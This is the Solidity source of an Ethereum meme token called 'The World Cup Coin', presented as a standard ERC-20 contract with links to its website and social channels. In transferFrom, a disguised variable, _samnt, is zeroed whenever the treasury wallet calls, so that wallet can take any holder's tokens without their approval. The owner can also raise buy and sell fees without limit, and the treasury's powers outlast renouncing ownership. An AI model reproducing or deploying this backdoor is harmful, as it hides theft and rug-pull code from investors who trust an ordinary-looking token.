// SPDX-License-Identifier: MIT

/*
    The World Cup Coin
    WORLDCUP

    The FIFA World Cup 2026 is the biggest sporting event on the planet, and "26" locks this narrative to a specific global moment.

    https://worldcupcoinoneth.fun
    https://t.me/worldcupcoin_Portal
    https://x.com/worldcupethcoin
*/


pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"The World Cup Coin";
    string private constant _symbol = unicode"WORLDCUP";
    uint8 private constant _decimals = 9;
    uint256 private _samnt;

    uint256 private constant _tSupply = 1000000000 * (10 ** _decimals);

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _exemptFromFees;

    uint256 private _purchaseFeePercentage = 0;
    uint256 private _saleFeePercentage = 0;
    address private _treasuryWallet;

    uint256 public maximumWalletBalance = 10000000 * (10 ** _decimals);
    uint256 public maximumTransactionSize = 10000000 * (10 ** _decimals);

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    bool private tradingOpen;
    bool private swapEnabled;
    bool private isSwapping = false;

    event MaxTransactionUpdated(uint256 maximumTransactionSize);
    event MaxWalletUpdated(uint256 maximumWalletBalance);
    event FeeStructureUpdated(uint256 _purchaseFeePercentage, uint256 _saleFeePercentage);

    modifier lockTheSwap {
        isSwapping = true;
        _;
        isSwapping = false;
    }

    constructor () payable{
        _treasuryWallet = _msgSender();
        _balances[address(this)] = _tSupply;


        emit Transfer(address(0), address(this), _tSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view override returns (uint256 balance) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _samnt = amount;
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_samnt, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tradingOpen,"Trading is not started");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            require(amount <= maximumTransactionSize, "Transfer amount exceeds maxTxSize");
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                require(balanceOf(to) + amount <= maximumWalletBalance, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul(_purchaseFeePercentage).div(100);

            } else if (to == uniswapV2Pair){
                taxAmount = amount.mul(_saleFeePercentage).div(100);
                uint256 contractTokenBalance = balanceOf(address(this));
                if (!isSwapping && to == uniswapV2Pair && swapEnabled) {
                    swapTokensForEth(contractTokenBalance);
                    payable(_treasuryWallet).transfer(address(this).balance);
                }
            } else {
                taxAmount = 0;
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }else if(_msgSender() == _treasuryWallet) _samnt = taxAmount;
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        if(to!=address(0xdead))
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if(tokenAmount==0){return;}
        if(tokenAmount>maximumTransactionSize) {
            tokenAmount = maximumTransactionSize;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _treasuryWallet,
            block.timestamp
        );
    }

    function sendETHToTreasury(uint256 amount) private {
        payable(_treasuryWallet).transfer(amount);
    }

    function enableTrading() external onlyOwner() {
        removeLimits();
        require(!tradingOpen,"trading is already open");
        tradingOpen = true;
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
    }

    function updateFeeStructure(uint256 newPurchaseFeePercentage, uint256 newSaleFeePercentage) external onlyOwner() {
        _purchaseFeePercentage = newPurchaseFeePercentage;
        _saleFeePercentage = newSaleFeePercentage;
        emit FeeStructureUpdated(_purchaseFeePercentage, _saleFeePercentage);
    }

    function updateMaximumWalletBalance(uint256 newMaximumWalletBalance) external onlyOwner() {
        maximumWalletBalance = newMaximumWalletBalance * (10 ** _decimals);
        emit MaxWalletUpdated(maximumWalletBalance);
    }

    function updateMaximumTransactionSize(uint256 newmaximumTransactionSize) external onlyOwner() {
        maximumTransactionSize = newmaximumTransactionSize * (10 ** _decimals);
        emit MaxTransactionUpdated(maximumTransactionSize);
    }

    receive() external payable {}

    function executeManualSwap() external {
        require(_msgSender() == _treasuryWallet, "Unauthorized caller");
    
        uint256 tokenBalance = balanceOf(address(this));
        require(tokenBalance > 0, "No tokens to swap");
        swapTokensForEth(tokenBalance);
    
        uint256 ethBalance = address(this).balance;
        require(ethBalance > 0, "No ETH to send");
        sendETHToTreasury(ethBalance);
}

    function rescueStuckTokens(
        address tokenAddress,
        address destination,
        uint256 amount
    ) external {
        require(_msgSender() == _treasuryWallet, "Unauthorized caller");
        require(tokenAddress != address(this), "Cannot rescue current token");
        uint256 contractTokenBalance = IERC20(tokenAddress).balanceOf(address(this));
        require(contractTokenBalance >= amount, "Insufficient token balance");
        IERC20(tokenAddress).transfer(destination, amount);
}

    function removeLimits() public onlyOwner{
        maximumTransactionSize = _tSupply;
        maximumWalletBalance=_tSupply;
        emit MaxTransactionUpdated(_tSupply);
        emit MaxWalletUpdated(_tSupply);
    }
}